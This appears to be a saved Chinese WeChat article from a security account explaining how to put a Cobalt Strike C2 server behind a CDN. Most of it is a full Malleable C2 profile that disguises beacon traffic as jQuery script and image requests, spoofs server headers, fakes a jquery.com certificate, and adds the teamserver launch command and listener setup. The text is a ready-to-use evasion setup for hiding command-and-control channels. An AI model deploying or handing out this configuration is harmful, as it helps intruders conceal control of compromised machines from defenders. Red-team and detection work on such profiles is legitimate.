<html>
<head>
<title>CS如何配置通过CDN上线</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
CS如何配置通过CDN上线
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                <span id="copyright_logo" class="rich_media_meta icon_appmsg_tag appmsg_title_tag weui-wa-hotarea">原创</span>
                                                                                            <span class="rich_media_meta rich_media_meta_text">
                                                                    Sp4ce
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2020-08-25</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><p data-mpa-powered-by="yiban.io"><strong style="font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;color: rgb(255, 104, 39);">0X00&nbsp;&nbsp;&nbsp;&nbsp;所需</strong><br  /></p><p><span style="font-size:15px;line-height:35px;;">域名*1</span></p><p><span style="font-size:15px;line-height:35px;;">CDN*1</span></p><p><span style="font-size:15px;line-height:35px;;">VPS*1</span></p><p><br  /></p><p><span style="color: rgb(255, 104, 39);"><strong>0X01&nbsp;&nbsp;&nbsp;&nbsp;部署</strong></span></p><p><span style="font-size:16px;line-height:36px;;">域名购买后将DNS更改为CDN服务商的DNS服务器，然后等待生效</span></p><p><span style="font-size:16px;line-height:36px;;">以CF为例，生效后会给邮箱发一封邮件</span></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.6765676567656765" data-s="300,640" src="图片/HACK学习呀_2020-08-25_CS如何配置通过CDN上线/1_zaKLeeNDvqA9CPFAHbiaGzFfAAzupA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9MbeMJmpR2cicGhCqqvT1ZAv29uq1fKkssPez9nbmZ0C9iaCiczaKLeeNDvqA9CPFAHbiaGzFfAAzupA/640?wx_fmt=png'" data-type="png" data-w="1212" style=""  /><span style="font-size:16px;line-height:36px;;font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;text-align: justify;"></span></p><p style="text-align: center;"><span style="font-size:16px;line-height:36px;;font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;text-align: justify;">然后配置解析域名</span></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.6733576642335767" data-s="300,640" src="图片/HACK学习呀_2020-08-25_CS如何配置通过CDN上线/2_7bTibYGI0icRdESexSXcn1dxVe9NnA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9MbeMJmpR2cicGhCqqvT1ZAGicFTKRCmuI8aCX0LfsnARiahw0n7bTibYGI0icRdESexSXcn1dxVe9NnA/640?wx_fmt=png'" data-type="png" data-w="1096" style=""  /><span style="font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: justify;"></span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="powershell"><code><span class="code-snippet_outer">###</span></code><code><span class="code-snippet_outer"> # @Author         : Sp4ce</span></code><code><span class="code-snippet_outer"> # @Date           : 2020-07-15 11:59:42</span></code><code><span class="code-snippet_outer"> # @LastEditors    : Sp4ce</span></code><code><span class="code-snippet_outer"> # @LastEditTime   : 2020-07-15 15:14:57</span></code><code><span class="code-snippet_outer"> # @Description    : Challenge Everything.</span></code><code><span class="code-snippet_outer">### </span></code><code><span class="code-snippet_outer">set sample_name "Etumbot";</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">set sleeptime "2000";</span></code><code><span class="code-snippet_outer">set jitter    "0";</span></code><code><span class="code-snippet_outer">set maxdns    "255";</span></code><code><span class="code-snippet_outer">set useragent "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)";</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">http-get {</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">    set uri "/image/";</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">    client {</span></code><code><span class="code-snippet_outer">        header "Host" "CS上线域名";</span></code><code><span class="code-snippet_outer">        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*l;q=0.8";</span></code><code><span class="code-snippet_outer">        header "Referer" "http://www.google.com";</span></code><code><span class="code-snippet_outer">        header "Pragma" "no-cache";</span></code><code><span class="code-snippet_outer">        header "Cache-Control" "no-cache";</span></code><code><span class="code-snippet_outer">        metadata {</span></code><code><span class="code-snippet_outer">            netbios;</span></code><code><span class="code-snippet_outer">            append "-.jpg";</span></code><code><span class="code-snippet_outer">            uri-append;</span></code><code><span class="code-snippet_outer">        }</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">    server {</span></code><code><span class="code-snippet_outer">        header "Content-Type" "img/jpg";</span></code><code><span class="code-snippet_outer">        header "Server" "nginx/1.10.3 (Ubuntu)";</span></code><code><span class="code-snippet_outer">        output {</span></code><code><span class="code-snippet_outer">            base64;</span></code><code><span class="code-snippet_outer">            print;</span></code><code><span class="code-snippet_outer">        }</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">https-certificate {</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">    ## Option 1) Trusted and Signed Certificate</span></code><code><span class="code-snippet_outer">    ## Use keytool to create a Java Keystore file. </span></code><code><span class="code-snippet_outer">    ## Refer to https://www.cobaltstrike.com/help-malleable-c2#validssl</span></code><code><span class="code-snippet_outer">    ## or https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/HTTPsC2DoneRight.sh</span></code><code><span class="code-snippet_outer">    ## Option 2) Create your own Self-Signed Certificate</span></code><code><span class="code-snippet_outer">    ## Use keytool to import your own self signed certificates</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">    set keystore "./spoofdomain.store";</span></code><code><span class="code-snippet_outer">    set password "mypass";</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">    ## Option 3) Cobalt Strike Self-Signed Certificate</span></code><code><span class="code-snippet_outer">    set C   "US";</span></code><code><span class="code-snippet_outer">    set CN  "jquery.com";</span></code><code><span class="code-snippet_outer">    set O   "jQuery";</span></code><code><span class="code-snippet_outer">    set OU  "Certificate Authority";</span></code><code><span class="code-snippet_outer">    set validity "365";</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">http-stager {  </span></code><code><span class="code-snippet_outer">    set uri_x86 "/jquery-3.3.1.slim.min.js";</span></code><code><span class="code-snippet_outer">    set uri_x64 "/jquery-3.3.2.slim.min.js";</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">    server {</span></code><code><span class="code-snippet_outer">        header "Server" "NetDNA-cache/2.2";</span></code><code><span class="code-snippet_outer">        header "Cache-Control" "max-age=0, no-cache";</span></code><code><span class="code-snippet_outer">        header "Pragma" "no-cache";</span></code><code><span class="code-snippet_outer">        header "Connection" "keep-alive";</span></code><code><span class="code-snippet_outer">        header "Content-Type" "application/javascript; charset=utf-8";</span></code><code><span class="code-snippet_outer">        output {</span></code><code><span class="code-snippet_outer">            ## The javascript was changed.  Double quotes and backslashes were escaped to properly render (Refer to Tips for Profile Parameter Values)</span></code><code><span class="code-snippet_outer">            # 2nd Line            </span></code><code><span class="code-snippet_outer">            prepend "!function(e,t){\"use strict\";\"object\"==typeof module&amp;&amp;\"object\"==typeof module.exports?module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error(\"jQuery requires a window with a document\");return t(e)}:t(e)}(\"undefined\"!=typeof window?window:this,function(e,t){\"use strict\";var n=[],r=e.document,i=Object.getPrototypeOf,o=n.slice,a=n.concat,s=n.push,u=n.indexOf,l={},c=l.toString,f=l.hasOwnProperty,p=f.toString,d=p.call(Object),h={},g=function e(t){return\"function\"==typeof t&amp;&amp;\"number\"!=typeof t.nodeType},y=function e(t){return null!=t&amp;&amp;t===t.window},v={type:!0,src:!0,noModule:!0};function m(e,t,n){var i,o=(t=t||r).createElement(\"script\");if(o.text=e,n)for(i in v)n[i]&amp;&amp;(o[i]=n[i]);t.head.appendChild(o).parentNode.removeChild(o)}function x(e){return null==e?e+\"\":\"object\"==typeof e||\"function\"==typeof e?l[c.call(e)]||\"object\":typeof e}var b=\"3.3.1\",w=function(e,t){return new w.fn.init(e,t)},T=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g;w.fn=w.prototype={jquery:\"3.3.1\",constructor:w,length:0,toArray:function(){return o.call(this)},get:function(e){return null==e?o.call(this):e&lt;0?this[e+this.length]:this[e]},pushStack:function(e){var t=w.merge(this.constructor(),e);return t.prevObject=this,t},each:function(e){return w.each(this,e)},map:function(e){return this.pushStack(w.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(o.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(e&lt;0?t:0);return this.pushStack(n&gt;=0&amp;&amp;n&lt;t?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},w.extend=w.fn.extend=function(){var e,t,n,r,i,o,a=arguments[0]||{},s=1,u=arguments.length,l=!1;for(\"boolean\"==typeof a&amp;&amp;(l=a,a=arguments[s]||{},s++),\"object\"==typeof a||g(a)||(a={}),s===u&amp;&amp;(a=this,s--);s&lt;u;s++)if(null!=(e=arguments[s]))for(t in e)n=a[t],a!==(r=e[t])&amp;&amp;(l&amp;&amp;r&amp;&amp;(w.isPlainObject(r)||(i=Array.isArray(r)))?(i?(i=!1,o=n&amp;&amp;Array.isArray(n)?n:[]):o=n&amp;&amp;w.isPlainObject(n)?n:{},a[t]=w.extend(l,o,r)):void 0!==r&amp;&amp;(a[t]=r));return a},w.extend({expando:\"jQuery\"+(\"3.3.1\"+Math.random()).replace(/\\D/g,\"\"),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isPlainObject:function(e){var t,n;return!(!e||\"[object Object]\"!==c.call(e))&amp;&amp;(!(t=i(e))||\"function\"==typeof(n=f.call(t,\"constructor\")&amp;&amp;t.constructor)&amp;&amp;p.call(n)===d)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},globalEval:function(e){m(e)},each:function(e,t){var n,r=0;if(C(e)){for(n=e.length;r&lt;n;r++)if(!1===t.call(e[r],r,e[r]))break}else for(r in e)if(!1===t.call(e[r],r,e[r]))break;return e},trim:function(e){return null==e?\"\":(e+\"\").replace(T,\"\")},makeArray:function(e,t){var n=t||[];return null!=e&amp;&amp;(C(Object(e))?w.merge(n,\"string\"==typeof e?[e]:e):s.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:u.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;r&lt;n;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,a=e.length,s=!n;o&lt;a;o++)(r=!t(e[o],o))!==s&amp;&amp;i.push(e[o]);return i},map:function(e,t,n){var r,i,o=0,s=[];if(C(e))for(r=e.length;o&lt;r;o++)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);else for(o in e)null!=(i=t(e[o],o,n))&amp;&amp;s.push(i);return a.apply([],s)},guid:1,support:h}),\"function\"==typeof Symbol&amp;&amp;(w.fn[Symbol.iterator]=n[Symbol.iterator]),w.each(\"Boolean Number String Function Array Date RegExp Object Error Symbol\".split(\" \"),function(e,t){l[\"[object \"+t+\"]\"]=t.toLowerCase()});function C(e){var t=!!e&amp;&amp;\"length\"in e&amp;&amp;e.length,n=x(e);return!g(e)&amp;&amp;!y(e)&amp;&amp;(\"array\"===n||0===t||\"number\"==typeof t&amp;&amp;t&gt;0&amp;&amp;t-1 in e)}var E=function(e){var t,n,r,i,o,a,s,u,l,c,f,p,d,h,g,y,v,m,x,b=\"sizzle\"+1*new Date,w=e.document,T=0,C=0,E=ae(),k=ae(),S=ae(),D=function(e,t){return e===t&amp;&amp;(f=!0),0},N={}.hasOwnProperty,A=[],j=A.pop,q=A.push,L=A.push,H=A.slice,O=function(e,t){for(var n=0,r=e.length;n&lt;r;n++)if(e[n]===t)return n;return-1},P=\"\r";</span></code><code><span class="code-snippet_outer">            # 1st Line</span></code><code><span class="code-snippet_outer">            prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */";</span></code><code><span class="code-snippet_outer">            append "\".(o=t.documentElement,Math.max(t.body[\"scroll\"+e],o[\"scroll\"+e],t.body[\"offset\"+e],o[\"offset\"+e],o[\"client\"+e])):void 0===i?w.css(t,n,s):w.style(t,n,i,s)},t,a?i:void 0,a)}})}),w.each(\"blur focus focusin focusout resize scroll click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup contextmenu\".split(\" \"),function(e,t){w.fn[t]=function(e,n){return arguments.length&gt;0?this.on(t,null,e,n):this.trigger(t)}}),w.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)}}),w.fn.extend({bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,\"**\"):this.off(t,e||\"**\",n)}}),w.proxy=function(e,t){var n,r,i;if(\"string\"==typeof t&amp;&amp;(n=e[t],t=e,e=n),g(e))return r=o.call(arguments,2),i=function(){return e.apply(t||this,r.concat(o.call(arguments)))},i.guid=e.guid=e.guid||w.guid++,i},w.holdReady=function(e){e?w.readyWait++:w.ready(!0)},w.isArray=Array.isArray,w.parseJSON=JSON.parse,w.nodeName=N,w.isFunction=g,w.isWindow=y,w.camelCase=G,w.type=x,w.now=Date.now,w.isNumeric=function(e){var t=w.type(e);return(\"number\"===t||\"string\"===t)&amp;&amp;!isNaN(e-parseFloat(e))},\"function\"==typeof define&amp;&amp;define.amd&amp;&amp;define(\"jquery\",[],function(){return w});var Jt=e.jQuery,Kt=e.$;return w.noConflict=function(t){return e.$===w&amp;&amp;(e.$=Kt),t&amp;&amp;e.jQuery===w&amp;&amp;(e.jQuery=Jt),w},t||(e.jQuery=e.$=w),w});";</span></code><code><span class="code-snippet_outer">            print;</span></code><code><span class="code-snippet_outer">        }</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">    client {</span></code><code><span class="code-snippet_outer">        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";</span></code><code><span class="code-snippet_outer">        header "Accept-Language" "en-US,en;q=0.5";</span></code><code><span class="code-snippet_outer">        header "Host" "CS上线域名";</span></code><code><span class="code-snippet_outer">        header "Referer" "http://code.jquery.com/";</span></code><code><span class="code-snippet_outer">        header "Accept-Encoding" "gzip, deflate";</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">http-post {</span></code><code><span class="code-snippet_outer">    set uri "/history/";</span></code><code><span class="code-snippet_outer">    client {</span></code><code><span class="code-snippet_outer">        header "Host" "CS上线域名";</span></code><code><span class="code-snippet_outer">        header "Content-Type" "application/octet-stream";</span></code><code><span class="code-snippet_outer">        header "Referer" "http://www.google.com";</span></code><code><span class="code-snippet_outer">        header "Pragma" "no-cache";</span></code><code><span class="code-snippet_outer">        header "Cache-Control" "no-cache";</span></code><code><span class="code-snippet_outer">        id {</span></code><code><span class="code-snippet_outer">            netbiosu;</span></code><code><span class="code-snippet_outer">            append ".asp";</span></code><code><span class="code-snippet_outer">            uri-append;</span></code><code><span class="code-snippet_outer">        }</span></code><code><span class="code-snippet_outer">        output {</span></code><code><span class="code-snippet_outer">            base64;</span></code><code><span class="code-snippet_outer">            print;</span></code><code><span class="code-snippet_outer">        }</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">    server {</span></code><code><span class="code-snippet_outer">        header "Content-Type" "img/jpg";</span></code><code><span class="code-snippet_outer">        header "Server" "Microsoft-IIS/10.0";</span></code><code><span class="code-snippet_outer">        header "X-Powered-By" "ASP.NET";</span></code><code><span class="code-snippet_outer">        output {</span></code><code><span class="code-snippet_outer">            base64;</span></code><code><span class="code-snippet_outer">            print;</span></code><code><span class="code-snippet_outer">        }</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">http-config {</span></code><code><span class="code-snippet_outer">    set trust_x_forwarded_for "true";</span></code><code><span class="code-snippet_outer">}</span></code></pre></section><p><span style="font-size:16px;line-height:36px;;">C2.profile传到C2服务器上，与CS文件同级目录，命令启动</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js"><code><span class="code-snippet_outer">./teamserver C2IP C2PASS ./c2.profile</span></code></pre></section><p><br  /></p><p><span style="font-size:16px;line-height:36px;;">然后攻击机新建监听器，配置如下</span></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="1.1345794392523365" data-s="300,640" src="图片/HACK学习呀_2020-08-25_CS如何配置通过CDN上线/3_OhfbFWKEibC08cOEOebzMXgGZoHBsA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9MbeMJmpR2cicGhCqqvT1ZAxOxEdhhcfyQhNygzKVsWjJ1CdOhfbFWKEibC08cOEOebzMXgGZoHBsA/640?wx_fmt=png'" data-type="png" data-w="535" style=""  /></p><p><span style="font-size:16px;line-height:36px;;font family: mp-quote, -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">上线测试</span><br  /></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.24296875" data-s="300,640" src="图片/HACK学习呀_2020-08-25_CS如何配置通过CDN上线/4_WdxLtE1NbQg3dpzCx3nSf7BWicRjjA.png" 